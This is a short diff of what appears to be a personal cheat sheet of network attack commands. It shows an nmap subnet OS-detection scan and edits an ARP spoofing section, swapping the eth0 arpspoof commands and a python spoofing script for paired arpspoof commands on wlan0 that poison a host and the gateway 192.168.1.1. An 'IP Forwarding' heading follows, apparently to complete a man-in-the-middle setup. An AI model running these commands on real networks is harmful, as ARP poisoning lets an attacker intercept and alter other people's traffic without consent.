@@ -38,10 +38,8 @@ sudo nmap --osscan-guess "192.168.1.1/24"
 
 # ARP SPOOF
 ## arpsoof
-arpspoof -i eth0 -t 192.168.1.221 192.168.1.1
-arpspoof -i eth0 -t 192.168.1.1 192.168.1.221
-## python script
-sudo python3 arp_spoof.py -t 192.168.1.109 -r 192.168.1.1
+arpspoof -i wlan0 -t 192.168.1.226 192.168.1.1
+arpspoof -i wlan0 -t 192.168.1.1 192.168.1.226
 
 # IP Forwarding
 
